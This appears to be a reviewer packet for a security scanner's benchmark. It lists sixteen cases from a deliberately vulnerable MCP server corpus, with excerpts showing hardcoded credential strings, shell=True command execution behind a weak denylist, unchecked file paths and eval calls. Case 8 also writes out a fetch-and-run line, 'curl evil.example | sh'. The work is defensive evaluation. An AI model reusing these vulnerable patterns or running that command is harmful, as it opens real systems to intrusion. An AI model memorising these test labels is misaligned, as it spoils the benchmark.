# Phase 3 reviewer packet

Purpose: let a second reviewer examine each case below and record an
independent decision, without being told whether the scanner detected it.
Preparing this packet is not itself a review. No case listed here should
be treated as independently reviewed until a second reviewer has filled in
their own decision, rationale, and disagreement fields.

**Update after correction review**: Case 15's "proposed expected result"
below is the ORIGINAL Phase 3 proposal and is now disputed, not this
packet's own conclusion. A correctness review found that per-tool
decorator gating (the reasoning Case 15 relied on) is unsound, and the
scanner behavior it describes has been reverted -- see
`docs/phase3-corrections.md`. Case 15 is presented here as disputed
material for the second reviewer to weigh in on, not as a settled
recommendation. Case 16 is similarly a potential ground-truth gap, not a
confirmed one -- see its own note below.

Scope: the DVMCP and local-boundaries-v1 cases affected by the five Phase 3
detector changes (MCP004, MCP002, MCP001, MCP003 duplicate suppression,
RDY002), plus one newly observed location that the existing ground truth
does not currently cover as its own case (case 16). Corpus code is
reproduced here only as short read-only excerpts for review context; it is
never executed.

For every case: Corpus and file / Relevant source region / Claimed
vulnerability class / Source / Sink / Preconditions / Proposed expected
result are filled in as the preparer's proposal. Reviewer decision,
reviewer rationale, and disagreement are intentionally left blank.

---

## Case 1 -- dvmcp-c03-hardcoded-credentials

- **Corpus and file**: dvmcp-79734c19, `challenges/easy/challenge3/server.py`
- **Relevant source region**: lines 44-57
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: literal multiline string argument to `f.write(...)`
- **Sink**: none (data at rest, not a code-execution sink) -- the risk is disclosure if the written file becomes reachable
- **Preconditions**: the file this string is written to becomes readable by some other means (misconfigured resource, path traversal elsewhere in the same server, etc.)
- **Excerpt**:
  ```
  with open("/tmp/dvmcp_challenge3/private/system_credentials.txt", "w") as f:
      f.write("""
  SYSTEM CREDENTIALS - HIGHLY RESTRICTED
  -------------------------------------
  Production Database:
    Host: db.acmecorp.internal
    Username: admin_prod
    Password: [REDACTED CREDENTIAL LITERAL]

  Cloud Infrastructure:
    Account ID: ACME-CLOUD-92731
    API Key: ak_live_7y2JHGd8sKlM9nPzXqRt5vWx
    Secret: cs_live_bNp5T2vR8sKlM9nQzXwJhGf4
  """)
  ```
- **Proposed expected result**: finding, MCP004, one case for the whole multiline string (multiple fields = one logical bundle)
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 2 -- dvmcp-c05-trusted-hardcoded-secrets

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge5/server.py`
- **Relevant source region**: lines 9-19
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: literal multiline string returned by a resource function
- **Sink**: MCP resource read (`system://secrets`, `listed=False`)
- **Preconditions**: a client enumerates or otherwise reaches an unlisted resource URI
- **Excerpt**:
  ```
  @trusted_server.resource("system://secrets", listed=False)
  def get_secrets() -> str:
      """System secrets - RESTRICTED ACCESS"""
      return """
      SYSTEM SECRETS
      --------------
      Database Password: [REDACTED CREDENTIAL LITERAL]
      Admin Account: admin@example.com / [REDACTED PASSWORD]
      API Key: [REDACTED API KEY]
      Encryption Key: [REDACTED ENCRYPTION KEY]
      """
  ```
- **Proposed expected result**: finding, MCP004, one case for this multiline string
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 3 -- dvmcp-c05-combined-hardcoded-secrets

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge5/server.py`
- **Relevant source region**: lines 115-125
- **Claimed vulnerability class**: hardcoded-secret
- **Source / Sink / Preconditions**: identical shape and reasoning to Case 2 -- this is the same literal secrets block re-registered on a second FastMCP server instance in the same file
- **Proposed expected result**: finding, MCP004, one case (distinct AST location from Case 2, so counted separately even though the literal text is identical)
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 4 -- dvmcp-c06-hardcoded-document-keys

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge6/server.py`
- **Relevant source region**: lines 13-32
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: literal multiline string argument to `f.write(...)`
- **Sink**: none (data at rest; the memo is later exposed via a documents resource elsewhere in the same file)
- **Preconditions**: the memo file is later read back through the server's document-listing/reading tools
- **Excerpt**:
  ```
  with open("/tmp/dvmcp_challenge6/documents/internal_memo.txt", "w") as f:
      f.write("""
  CONFIDENTIAL INTERNAL MEMO
  --------------------------
  ...
  Current Production API Keys:
  - Main API: [REDACTED API KEY]
  - Payment Gateway: [REDACTED API KEY]
  - Analytics Service: as_prod_2p3o4i5u6y7t8r9e

  These keys will be rotated after the audit.
  """)
  ```
- **Proposed expected result**: finding, MCP004, one case. Note for the reviewer: the per-item labels ("Main API", "Payment Gateway") are not themselves secret-shaped words -- the detector treats "Current Production API Keys:" as a section header that puts the bulleted lines below it in a credential context. Please specifically judge whether that section-header inference is reasonable, since it is the least conservative part of the MCP004 redesign.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 5 -- dvmcp-c06-hardcoded-resource-keys

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge6/server.py`
- **Relevant source region**: lines 55-67
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: literal multiline string returned by a resource function
- **Sink**: MCP resource read (`internal://credentials`)
- **Preconditions**: a client reaches the resource
- **Excerpt**: same section-header + bulleted-list shape as Case 4 ("SYSTEM API KEYS" underlined with dashes, followed by bulleted `Label: value` lines), on a different resource function
- **Proposed expected result**: finding, MCP004, one case
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 6 -- dvmcp-c07-hardcoded-tokens

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge7/server.py`
- **Relevant source region**: lines 14-36
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: dict literal with three nested per-service credential dicts
- **Sink**: `json.dump(tokens, f, ...)` (written to disk), and the dict is also read back and returned to clients by several tools/resources later in the file
- **Preconditions**: a client reaches any tool/resource that surfaces `get_tokens()`'s return value
- **Excerpt**:
  ```
  tokens = {
      "email_service": {
          "service_name": "EmailPro API",
          "api_key": "epro_api_5f4e3d2c1b0a9z8y7x",
          "access_token": "eyJhbGciOiJIUzI1NiIs...",
          "refresh_token": "[REDACTED REFRESH TOKEN]",
          "expires_at": "2025-12-31T23:59:59Z"
      },
      "cloud_storage": { ... },
      "analytics_platform": { ... }
  }
  ```
- **Proposed expected result**: finding, MCP004, one case for the whole dict (three nested service dicts = one logical bundle, not three)
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 7 -- dvmcp-c10-hardcoded-tokens

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge10/server.py`
- **Relevant source region**: lines 44-48
- **Claimed vulnerability class**: hardcoded-secret
- **Source / Sink / Preconditions**: same shape as Case 6 -- a dict literal with `admin_token`/`service_token`/`user_token` keys, written to disk and read back by later tools
- **Proposed expected result**: finding, MCP004, one case for the dict
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 8 -- dvmcp-c08-shell-command

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge8/server.py`
- **Relevant source region**: lines 86-116 (guard at 102-107, sink at 110)
- **Claimed vulnerability class**: command-injection
- **Source**: `command: str` tool parameter
- **Sink**: `subprocess.check_output(command, shell=True, ...)`
- **Preconditions**: caller supplies a `command` value containing shell metacharacters or a command not in the small blocklist
- **Excerpt**:
  ```
  dangerous_commands = ["rm", "mkfs", "dd", "format", ">", ">>"]
  if any(cmd in command for cmd in dangerous_commands):
      return "Error: Command contains potentially dangerous operations and has been blocked."
  result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
  ```
- **Proposed expected result**: finding, MCP001. The guard is a partial denylist (a handful of blocked substrings) checked with `in`, not an allowlist checked with `not in` -- it does not constrain the shell string to a known-safe value (e.g. `curl evil.example | sh` passes it untouched).
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 9 -- dvmcp-c08-arbitrary-log-path

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge8/server.py`
- **Relevant source region**: lines 120-141 (guard at 136-137, sink at 140)
- **Claimed vulnerability class**: path-traversal
- **Source**: `log_path: str` tool parameter
- **Sink**: `open(log_path, 'r')`
- **Preconditions**: caller supplies an absolute path or a `../`-relative path outside the intended log directory
- **Excerpt**:
  ```
  if not os.path.exists(log_path):
      return f"Error: File '{log_path}' not found."
  with open(log_path, 'r') as f:
      content = f.read()
  ```
- **Proposed expected result**: finding, MCP002. An existence check proves the target exists somewhere on disk; it says nothing about which directory. No resolution or containment check is present.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 10 -- dvmcp-c10-arbitrary-log-path

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge10/server.py`
- **Relevant source region**: lines 328-346 (guard at 341-342, sink at 345)
- **Claimed vulnerability class**: path-traversal
- **Source / Sink / Preconditions**: identical shape to Case 9 (existence check only, `file_path` parameter), same file
- **Proposed expected result**: finding, MCP002
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 11 -- dvmcp-c10-fixed-command-map (safe case)

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge10/server.py`
- **Relevant source region**: lines 249-265
- **Claimed vulnerability class**: none -- this is a ground-truth *safe* case (`in_scope_safe`), included here because the Phase 2 scanner incorrectly flagged it and Phase 3 changes the reasoning that suppresses it
- **Source**: `component: str` tool parameter
- **Sink**: `subprocess.check_output(command, shell=True, ...)`, where `command = commands[component]`
- **Preconditions**: none that reach shell content -- `component` only ever selects which fixed literal string is assigned to `command`
- **Excerpt**:
  ```
  commands = {
      "all": "echo 'Running full system diagnostic...' && uptime && free -h && df -h && netstat -tuln",
      "cpu": "echo 'CPU diagnostic:' && uptime && cat /proc/cpuinfo | grep 'model name' | head -1",
      "memory": "echo 'Memory diagnostic:' && free -h",
      "disk": "echo 'Disk diagnostic:' && df -h",
      "network": "echo 'Network diagnostic:' && netstat -tuln"
  }
  if component not in commands:
      return f"Error: Invalid component '{component}'. Valid options: ..."
  command = commands[component]
  result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
  ```
- **Proposed expected result**: no finding. `component`'s content never reaches the shell string -- it only selects among five fixed literal commands the developer wrote. Please specifically judge whether this reasoning holds even without the `if component not in commands` guard (the dict-subscript-of-safe-literal rule applies independently of that guard).
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 12 -- dvmcp-c05-eval-clean-expression / dvmcp-c05-eval-expression (duplicate-suppression pair)

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge5/server.py`
- **Relevant source region**: lines 66-107 (`calculate` on `malicious_server`); lines 143-153 (`trusted_calculate` on `combined_server`)
- **Claimed vulnerability class**: dynamic-code-execution
- **Source**: `expression: str` tool parameter
- **Sink**: `eval(clean_expr, {"__builtins__": {}})` at line 95, and `eval(expression, {"__builtins__": {}})` at line 104, both inside `malicious_server`'s `calculate`
- **Preconditions**: caller supplies an `expression` string; the `{"__builtins__": {}}` second argument narrows but does not eliminate risk (attribute-based sandbox escapes are a well-known category)
- **Reviewer context**: a *third*, differently named tool exists in the same file --
  ```
  @combined_server.tool()
  def trusted_calculate(expression: str) -> str:
      """... (from Trusted Calculator Server)."""
      return calculate(expression)  # This calls the trusted implementation
  ```
  The bare call `calculate(expression)` resolves (last-definition-wins name lookup) to `malicious_server`'s `calculate` -- the same function already scanned directly -- not to `trusted_server`'s same-named, non-vulnerable `calculate`. Phase 2 counted this as two additional findings (one extra per eval() call, at the same line as the correctly matched finding); Phase 3 suppresses the second copy as a duplicate of the same physical call site.
- **Proposed expected result**: two findings total (one at line 95, one at line 104) -- not four. Please judge whether collapsing by (rule, file, line, column, function_name) is the right identity here, and whether a reviewer would want the wrapper-routing detail preserved in the surviving finding's message (Phase 3 keeps whichever copy the traversal order produces first, which is the direct one; the one-hop wrapper detail is dropped along with the duplicate).
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 13 -- dvmcp-r07-auth

- **Corpus and file**: dvmcp-79734c19, `challenges/medium/challenge7/server.py`
- **Relevant source region**: line 231 (transport setup); line 41-43 and every call site of `get_tokens()` (lines 49, 70, 153, 210)
- **Claimed vulnerability class**: missing-transport-auth-hint
- **Source**: n/a (readiness check, not a tainted-parameter finding)
- **Sink**: `uvicorn.run("server:mcp", host="0.0.0.0", port=8007)` -- SSE/HTTP transport with no authentication middleware anywhere in the file
- **Preconditions**: none -- the transport itself accepts unauthenticated connections
- **Excerpt**:
  ```
  TOKEN_FILE = "/tmp/dvmcp_challenge7/tokens.json"
  ...
  def get_tokens():
      with open(TOKEN_FILE, "r") as f:
          return json.load(f)
  ...
  uvicorn.run("server:mcp", host="0.0.0.0", port=8007)
  ```
- **Proposed expected result**: finding, RDY002. `TOKEN_FILE` and `get_tokens()` are business-logic identifiers (reading a stored-tokens file for the demo's own tool responses); neither is transport-gating code. Every call site of `get_tokens()` is inside a `@mcp.tool()`/`@mcp.resource()` body.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 14 -- dvmcp-r10-auth

- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge10/server.py`
- **Relevant source region**: line 376 (transport setup); lines 142-172 (`authenticate` tool, `get_tokens()` call at 172)
- **Claimed vulnerability class**: missing-transport-auth-hint
- **Sink**: `uvicorn.run("server:mcp", host="0.0.0.0", port=8010)`
- **Excerpt**:
  ```
  @mcp.tool()
  def authenticate(username: str, password: str) -> str:
      """Authenticate a user with username and password. ..."""
      ...
      tokens = get_tokens()
      ...
  ...
  uvicorn.run("server:mcp", host="0.0.0.0", port=8010)
  ```
- **Proposed expected result**: finding, RDY002. `authenticate` is itself an MCP tool -- reachable through the same unauthenticated transport as every other tool, not a gate in front of it. A caller can invoke any other tool without ever calling `authenticate` first.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 15 -- local-safe-imported-auth (DISPUTED -- see correction note)

**Correction note (post-review)**: the reasoning below was the original
Phase 3 proposal (a per-tool decorator, regardless of name, treated as
transport-authentication evidence). A subsequent correctness review found
this unsound: a decorator wrapping ONE tool function proves at most that
one tool has some per-call behavior, not that the SSE/HTTP transport
itself is gated -- an unauthenticated caller can still reach a different
tool with no such decorator, or list tools at all. The `require_user`
decorator in this fixture is also, by its own docstring, a no-op stand-in
("Represent an external identity and policy check in this static
fixture") that literally does nothing. The scanner has been reverted to
NOT suppress RDY002 for this case. This case is presented as disputed
material, not a settled recommendation -- the second reviewer's job is to
decide whether local-boundaries-v1's ground truth (`local-safe-imported-auth`,
currently labeled `in_scope_safe`) is itself correct, given that no
general per-tool decorator heuristic can soundly distinguish this fixture
from a caching or logging decorator on an otherwise-unprotected tool. See
`docs/phase3-corrections.md` section 1 for the full reasoning.

- **Corpus and file**: local-boundaries-v1, `false_positive/imported_auth/server.py` (+ `guard.py`)
- **Relevant source region**: `server.py` lines 11-19; `guard.py` lines 9-11
- **Claimed vulnerability class**: cross-file-transport-auth (project-owned fixture, existing ground-truth safe case)
- **Sink**: `uvicorn.run("server:mcp", host="127.0.0.1", port=8000)`
- **Excerpt**:
  ```
  # server.py
  from .guard import require_user

  @mcp.tool()
  @require_user
  def account_summary() -> str:
      """Return the authorized caller's account summary."""
      return "authorized summary"

  # guard.py
  def require_user(function: T) -> T:
      """Represent an external identity and policy check in this static fixture."""
      return function
  ```
- **Proposed expected result (ORIGINAL, now disputed)**: no finding, on the theory that `require_user` -- a decorator stacked on the tool function itself, not a call inside its body -- wraps every invocation before the body runs, so its mere presence is evidence of a gate regardless of name. **This is no longer the preparer's position.** The corrected, current proposal is: finding (RDY002 should fire), because a per-tool decorator cannot be soundly distinguished from an unrelated one (tracing, retry, caching, logging) by inspecting only its call site, and this specific fixture's decorator is a documented no-op. The open question for the second reviewer is whether the ground-truth label itself (`in_scope_safe`) should change, independent of what the scanner currently does -- this packet does not resolve that, and the scanner's own ground truth has NOT been edited to force either answer.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

---

## Case 16 -- NEW, not yet in ground truth: possible embedded password in `get_admin_info`

- **Status**: this is not an existing ground-truth case. It is a location the Phase 3 MCP004 detector flags that has no corresponding case in `benchmark/ground_truth/dvmcp-79734c19.json`. It is surfaced here as a POTENTIAL ground-truth gap awaiting independent review -- not a confirmed one, and not confirmed to be free of scanner defect either. Two explanations are both plausible and this packet does not adjudicate between them: (a) the original ground-truth adjudication simply didn't record a second finding at an already-covered location (a gap), or (b) the MCP004 section-header inference (see case 4/5's note on the same mechanism) is over-eager and this is a correct catch that happens to coincide with an under-specified label, or something in between. See "Research-integrity note" below.
- **Corpus and file**: dvmcp-79734c19, `challenges/hard/challenge10/server.py`
- **Relevant source region**: lines 119-134
- **Claimed vulnerability class**: hardcoded-secret
- **Source**: literal multiline string returned by a resource function
- **Sink**: MCP resource read (`internal://credentials`, function `get_admin_info`)
- **Preconditions**: a client reaches the resource
- **Excerpt**:
  ```
  @mcp.resource("internal://credentials")
  def get_admin_info() -> str:
      """ADMIN ONLY: Sensitive system information"""
      return """
  ADMIN DASHBOARD
  --------------
  System Status: All services operational
  Last Backup: 2025-04-15 03:00 UTC
  Security Alerts: None

  SENSITIVE INFORMATION:
  - Master Password: [REDACTED CREDENTIAL LITERAL]
  - Recovery Email: recovery@acmecorp.com
  - Emergency Contact: John Doe (555-123-4567)
  ...
  ```
- **Existing ground truth at this location**: `dvmcp-c10-admin-resource` covers line 121 as MCP005 (sensitive-resource-exposure, for the resource itself). No case currently covers the embedded `Master Password` value as its own MCP004 finding.
- **Proposed expected result**: finding, MCP004 (in addition to the existing MCP005 finding at the same resource). This looks like a second, independent vulnerability class at the same location -- a hardcoded credential embedded in resource output -- not a duplicate of the resource-exposure finding.
- **Reviewer decision**: _____________________
- **Reviewer rationale**: _____________________
- **Disagreement**: _____________________

**Research-integrity note on Case 16**: per this project's contributing guidelines, a scanner-behavior change is never used to justify a same-cycle ground-truth edit. This case is recorded here for a future, separately reviewed ground-truth update; the Phase 3 benchmark run continues to score it as a false positive against the current, unmodified ground truth (see `docs/benchmark.md` and the Phase 3 report's "remaining FP" section). Do not close this case by editing `benchmark/ground_truth/dvmcp-79734c19.json` directly from this packet -- a ground-truth change needs its own reviewed change, with this packet's decision recorded as its rationale.

---

## Summary table

| # | Case ID | Rule | Corpus | File | Proposed result |
|---|---|---|---|---|---|
| 1 | dvmcp-c03-hardcoded-credentials | MCP004 | dvmcp | challenge3/server.py:44 | finding |
| 2 | dvmcp-c05-trusted-hardcoded-secrets | MCP004 | dvmcp | challenge5/server.py:12 | finding |
| 3 | dvmcp-c05-combined-hardcoded-secrets | MCP004 | dvmcp | challenge5/server.py:118 | finding |
| 4 | dvmcp-c06-hardcoded-document-keys | MCP004 | dvmcp | challenge6/server.py:13 | finding |
| 5 | dvmcp-c06-hardcoded-resource-keys | MCP004 | dvmcp | challenge6/server.py:55 | finding |
| 6 | dvmcp-c07-hardcoded-tokens | MCP004 | dvmcp | challenge7/server.py:14 | finding |
| 7 | dvmcp-c10-hardcoded-tokens | MCP004 | dvmcp | challenge10/server.py:44 | finding |
| 8 | dvmcp-c08-shell-command | MCP001 | dvmcp | challenge8/server.py:110 | finding |
| 9 | dvmcp-c08-arbitrary-log-path | MCP002 | dvmcp | challenge8/server.py:140 | finding |
| 10 | dvmcp-c10-arbitrary-log-path | MCP002 | dvmcp | challenge10/server.py:345 | finding |
| 11 | dvmcp-c10-fixed-command-map | MCP001 | dvmcp | challenge10/server.py:265 | no finding (safe) |
| 12 | dvmcp-c05-eval-clean/expression | MCP003 | dvmcp | challenge5/server.py:95,104 | 2 findings, not 4 |
| 13 | dvmcp-r07-auth | RDY002 | dvmcp | challenge7/server.py:231 | finding |
| 14 | dvmcp-r10-auth | RDY002 | dvmcp | challenge10/server.py:376 | finding |
| 15 | local-safe-imported-auth | RDY002 | local-boundaries-v1 | imported_auth/server.py:11 | DISPUTED -- finding (scanner reverted to this; ground-truth label unresolved) |
| 16 | (new, proposed) | MCP004 | dvmcp | challenge10/server.py:123 | finding (potential ground-truth gap, unconfirmed; scanner defect not ruled out) |
